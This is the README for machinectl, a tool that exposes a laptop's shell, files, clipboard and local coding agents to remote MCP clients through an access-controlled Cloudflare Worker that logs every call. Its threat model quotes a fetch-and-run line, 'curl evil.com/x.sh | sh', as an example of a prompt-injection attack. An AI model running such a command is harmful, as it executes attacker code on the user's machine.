# machinectl

Your laptop, as an MCP server. Reachable from Access-authenticated MCP clients, gated by Cloudflare Access, and audited at the Worker boundary.

> **Deployment note:** the default endpoint in this repository is the author's `my.ax.cloudflare.dev` Worker deployment. The daemon is useful to other operators when paired with a compatible Worker-side `MachineHost` endpoint and their own Cloudflare Access policy. No Cloudflare affiliation or support is implied.

## What changed from the prototype

The original machinectl bound a local port and pushed a Cloudflare quick tunnel up so an MCP client could reach in. That meant:

- The tunnel URL was the secret. Auth = "don't share the URL."
- The local daemon was the audit boundary. Lose the daemon, lose the trail.
- Anyone who learned the URL had a remote shell on your laptop.

**This version inverts that.** No inbound port, no public tunnel. The laptop daemon opens an outbound WebSocket to a Cloudflare Worker. The Worker is the MCP endpoint, sits behind Cloudflare Access, and writes an audit receipt for every tool call to KV. The laptop is just the runtime — auth, transport, and audit all live in front of it.

```
                       ┌──────────────────────────────┐
                       │ MCP client                   │
                       │ (Claude.ai / my-ax / etc)    │
                       └──────────────┬───────────────┘
                                      │ POST /machinectl/mcp
                                      │ (Cloudflare Access JWT)
                                      ▼
                       ┌──────────────────────────────┐
                       │ my.ax.cloudflare.dev Worker  │
                       │  • Access app gate           │
                       │  • per-user MachineHost DO   │
                       │  • AUDIT_KV receipts         │
                       └──────────────┬───────────────┘
                                      │ WebSocket (outbound from laptop)
                                      │ keyed by Access email
                       ┌──────────────▼───────────────┐
                       │ machinectl daemon            │
                       │ (this repo, on your laptop)  │
                       │  • allow-listed tools        │
                       │  • path-restricted FS access │
                       └──────────────────────────────┘
```

Close your laptop → WS drops → tools auto-disappear from MCP `tools/list`. No "tunnel I forgot was open."

## Install

```bash
git clone https://github.com/acoyfellow/machinectl ~/cloudflare/machinectl
cd ~/cloudflare/machinectl
npm install
npm run build
```

You need `cloudflared` installed locally so the daemon can fetch your Access JWT. Install once:

```bash
brew install cloudflared
```

## First-time auth

```bash
cloudflared access login https://my.ax.cloudflare.dev
```

Opens a browser, you SSO with Cloudflare, the JWT lands in `~/.cloudflared/`. The daemon reads it from there. Re-run if the JWT expires (typically every ~24h depending on the Access policy).

## Run

`MACHINECTL_ALLOWED_PATHS` is a comma-separated list of **absolute directory prefixes** the filesystem tools (`read_file`, `write_file`, `list_directory`) and local coding-agent sessions are allowed to touch. It has zero relationship to where the daemon binary itself lives.

```bash
# Allow filesystem tools to operate inside your work + personal project trees.
MACHINECTL_ALLOWED_PATHS=/Users/you/cloudflare,/Users/you/projects \
  ~/cloudflare/machinectl/dist/index.js
```

Want to open it to your whole home dir? Sure — but think about what's in there (`.ssh/`, `.aws/`, browser sessions, etc.) before you do:

```bash
MACHINECTL_ALLOWED_PATHS=$HOME ~/cloudflare/machinectl/dist/index.js
```

Want the daemon to run, but filesystem tools to refuse? Just leave the var unset:

```bash
~/cloudflare/machinectl/dist/index.js
# → [!] filesystem and agent-session tools are DISABLED
# → [!] set MACHINECTL_ALLOWED_PATHS=/abs/path1,/abs/path2 and restart to enable
```

`exec_command` and `git` always register. Their *optional* `cwd` argument is path-gated if you supply one; without `cwd`, they run in the daemon's PWD. Local-agent controls (`agent_*`) register only when allowed paths are configured, because every new pi/OpenCode process must start in an explicitly scoped repository. The other tools (`screenshot`, `processes`, `clipboard`, `notify`, `open` with a URL) aren't filesystem-bound and are unaffected.

Output on a successful connect:

```
[machinectl] machinectl daemon — machine: "your-macbook"
[machinectl] worker: https://my.ax.cloudflare.dev
[machinectl] tools registered: exec_command, git, agent_start, agent_list, agent_status, agent_logs, agent_prompt, agent_steer, agent_follow_up, agent_pi_command, agent_abort, agent_stop, read_file, write_file, list_directory, screenshot, processes, clipboard, notify, open
[machinectl] connecting to wss://my.ax.cloudflare.dev/machinectl/connect as "your-macbook"
[machinectl] connected; publishing tool catalog
```

Any MCP client that hits `https://my.ax.cloudflare.dev/machinectl/mcp` through the applicable Cloudflare Access policy sees the currently connected tool catalog and can call it. The call lands at the Worker, gets audited, gets pushed down your WebSocket, runs on your laptop, and returns through the same path.

## Config

| Env var | Default | What it does |
|---|---|---|
| `MACHINECTL_URL` | `https://my.ax.cloudflare.dev` | Worker base. Override for dev or for a separate deployment. |
| `MACHINECTL_NAME` | `os.hostname()` | Human-readable machine name surfaced in the catalog + audit logs. |
| `MACHINECTL_ALLOWED_PATHS` | (empty) | Comma-separated absolute directory prefixes the filesystem tools (`read_file`, `write_file`, `list_directory`) and local coding-agent sessions may touch. **Filesystem and `agent_*` tools refuse to register if empty.** Multiple paths: `MACHINECTL_ALLOWED_PATHS=/Users/me/work,/Users/me/projects,/tmp/scratch`. Unrelated to where the daemon binary lives. |
| `MACHINECTL_EXEC_TIMEOUT` | `60000` | Per-call timeout in ms for `exec_command` and `git`. Max 5 minutes hard cap. |
| `MACHINECTL_ACCESS_TOKEN` | (unset) | Override for the Access JWT instead of pulling from cloudflared. Useful in CI / containers. |
| `MACHINECTL_AGENT_MAX_SESSIONS` | `4` | Maximum concurrently active local pi/OpenCode sessions. Min 1, max 32. |
| `MACHINECTL_AGENT_MAX_RUNTIME_MS` | `7200000` | Hard lifetime limit per local coding-agent session (default 2 hours; min 1 minute, max 24 hours). |
| `MACHINECTL_AGENT_STOP_GRACE_MS` | `5000` | Grace period after SIGTERM before the agent process group is SIGKILLed. |

## Tools

| Tool | Description | Path-gated |
|---|---|---|
| `exec_command` | Run a shell command. Captures stdout/stderr/exit. 256KB output cap. Timeout from `MACHINECTL_EXEC_TIMEOUT`. | Optional cwd is gated. |
| `git` | Allow-listed git subcommands (status, diff, log, show, add, commit, push, pull, fetch, branch, stash, rebase, merge, cherry-pick, reset, revert, tag, blame, remote, config, rev-parse, describe, switch, checkout). | Optional cwd is gated. |
| `read_file` | Read a file (utf-8). Up to 256KB; larger files truncated with a notice. | Yes |
| `write_file` | Write content to a file. Creates parent dirs. Overwrites. | Yes |
| `list_directory` | List a directory. Set `recursive=true` and `maxDepth` (1–8, default 3) to walk children. | Yes |
| `screenshot` | Capture the screen, return base64 PNG. macOS: `screencapture`. Linux: `grim`/`scrot`. | No |
| `processes` | Top N processes by cpu or memory. | No |
| `clipboard` | Read/write the system clipboard. macOS: `pbpaste`/`pbcopy`. Linux: `wl-copy` / `xclip`. | No |
| `notify` | Send a system notification. macOS: `osascript`. Linux: `notify-send`. | No |
| `open` | Open a URL or file in the system default handler. URLs are unrestricted; file paths are gated. | Path arg gated. |
| `agent_start` | Start a local `pi` session over RPC, or a captured bounded `opencode run` job. | Requires a `cwd` inside configured allowed paths. |
| `agent_list` / `agent_status` / `agent_logs` | Inspect active sessions, structured pi events, captured output, and optionally recent saved pi sessions for resume. | No additional path access. |
| `agent_prompt` / `agent_steer` / `agent_follow_up` | Prompt or steer a live pi RPC session. | Existing session only. |
| `agent_pi_command` | Run allow-listed pi controls: state/messages/stats, model/thinking changes, compact, switch/fork/clone/export. | Existing session only. |
| `agent_abort` / `agent_stop` | Interrupt active work or stop the local agent process. | Existing session only. |

## Local coding agents

`machinectl` can act as a remote control plane for coding agents already authenticated and configured on your laptop.

### pi: live, steerable sessions

`agent_start({ agent: "pi", cwd: "/absolute/repo", prompt: "..." })` starts `pi --mode rpc` locally and returns a machinectl session id. That session remains alive in the daemon so an MCP caller can subsequently:

- list recent persisted pi sessions with `agent_list({ includePersistedPi: true })` and reopen one via `agent_start({ agent: "pi", session: "<id-or-path>", ... })`
- send more work with `agent_prompt`
- steer in-flight work with `agent_steer`
- queue later work with `agent_follow_up`
- inspect events/transcript/state with `agent_status` and `agent_pi_command`
- change model or thinking level with `agent_pi_command`
- abort or stop it with `agent_abort` / `agent_stop`

Example sequence from an MCP caller:

```text
agent_start({agent:"pi", cwd:"/Users/me/cloudflare/my-ax", prompt:"inspect the failing tests and fix them"})
agent_status({id:"<returned id>"})
agent_steer({id:"<returned id>", message:"do not modify migrations; keep the fix in UI code"})
agent_pi_command({id:"<returned id>", command:"get_last_assistant_text"})
```

### OpenCode: captured bounded jobs

`agent_start({ agent: "opencode", cwd: "/absolute/repo", prompt: "..." })` starts `opencode run --format json` and captures its output. Poll it with `agent_status` / `agent_logs` or stop it with `agent_stop`. Live prompt/steer controls are deliberately pi-only until OpenCode's programmatic session transport is integrated.

Agent processes inherit the daemon's user environment and local CLI credentials. `agent_start` refuses to run unless `MACHINECTL_ALLOWED_PATHS` is configured and its `cwd` falls within one of those roots. Saved pi-session discovery only exposes sessions whose original `cwd` remains inside those roots; explicit session paths, `switch_session`, and `export_html` output paths are likewise gated. Agent processes are capped by count and runtime, are stopped as process groups, and are terminated when the daemon shuts down. Restrict who can access the MCP endpoint accordingly.

## Audit

Every tool call writes a receipt to `AUDIT_KV` on the Worker side, keyed `machinectl:<email>:<ts>:<rand>`, 90-day TTL. Receipts include: timestamp, tool name, args, ok/error, content preview (capped at 2 KB so screenshots don't blow up the KV entry). No local audit file — the source of truth is the Worker.

Inspect receipts via the Worker's existing audit UI or via `wrangler kv key list --namespace-id <AUDIT_KV>`. (List/inspect tooling for `machinectl:` prefix is a TODO in the my-ax UI.)

## What's intentionally limited

- **No `MACHINECTL_TOKEN` / bearer-token-as-URL.** Access JWT is the auth. There is no fallback. Lose `cloudflared`, you can't connect.
- **No quick tunnel.** No public URL to leak.
- **No local dashboard.** The Worker's audit is the dashboard. No half-orphan UI on `localhost:7331` to forget about.
- **`exec_command` is full shell, by design.** It's audited end-to-end and gated by Access in front. If you want a more restricted variant, narrow `git`'s subcommand allow-list as a model and copy the pattern.
- **Filesystem and `agent_*` tools refuse to register without `MACHINECTL_ALLOWED_PATHS`.** No `$HOME` default. Forces deliberate scoping.
- **One laptop per user at a time.** Latest WS connection wins; previous gets a clean close. If you connect from your work laptop while your home laptop is already up, the home laptop disconnects.

## Threat model (honest)

The blast radius of `exec_command` is the same as any LLM-driven terminal you're already using on this machine (Claude Code, OpenCode, Codex, etc.). If you trust an LLM with shell access in *that* context, `machinectl` with `exec_command` is **strictly better**:

- Caller identity is the verified Cloudflare Access identity, not "the assistant" with no attribution attached.
- Every tool call writes a structured audit receipt to `AUDIT_KV` with 90-day TTL. Easy to grep, easy to alert on.
- Path-touching tools (`read_file`, `write_file`, `list_directory`, `open` with a file path, `exec_command` with a `cwd`) are scoped to `MACHINECTL_ALLOWED_PATHS` with realpath enforcement against symlink escapes.
- No inbound port. No public URL. The only thing reachable from the internet is the Worker, behind Access.

What it does **not** defend against:
- A compromised laptop. If `~/.cloudflared/*.json` is stolen, the attacker can impersonate you until the JWT expires. Same as every other Access-protected service you use.
- Prompt injection convincing the agent to run `curl evil.com/x.sh | sh`. The audit log shows you (under your identity) did it; it doesn't prevent it. This is the existing trust model of every LLM-with-shell tool. machinectl makes it auditable, not impossible.
- An LLM you don't trust. The threat model assumes the LLM-on-the-other-end is operating in your interest. If it isn't, no audit log saves you.

If you wouldn't run a long-lived terminal session with an LLM that has shell access on this machine, don't run `machinectl` either. If you would (and increasingly most of us do), `machinectl` is the same surface area with better attribution and better audit.

## Multi-machine

The current design is single-machine-per-user. The MCP catalog the Worker exposes is whatever that one connected laptop publishes. The wire format already includes a `machineName` in the `hello` frame, so multi-machine routing (for example a per-call `machine` argument) is a straightforward extension, but is not implemented yet.

## Development

```bash
npm install
npm run typecheck
npm test
npm run dev
```

The Worker-side relay is not bundled into this npm package. To run your own endpoint, implement the outbound WebSocket and MCP routing contract documented by `src/protocol.ts`, place it behind an Access policy, and set `MACHINECTL_URL` to that deployment.

## Security reporting

This project deliberately provides remote shell-equivalent capability when `exec_command` is enabled (it is enabled by default). Do not run it against an Access endpoint you do not control or trust. If you find a vulnerability in authentication, routing, path enforcement, or audit behavior, please open a GitHub security advisory rather than a public exploit issue.

## License

MIT. See [LICENSE](./LICENSE).
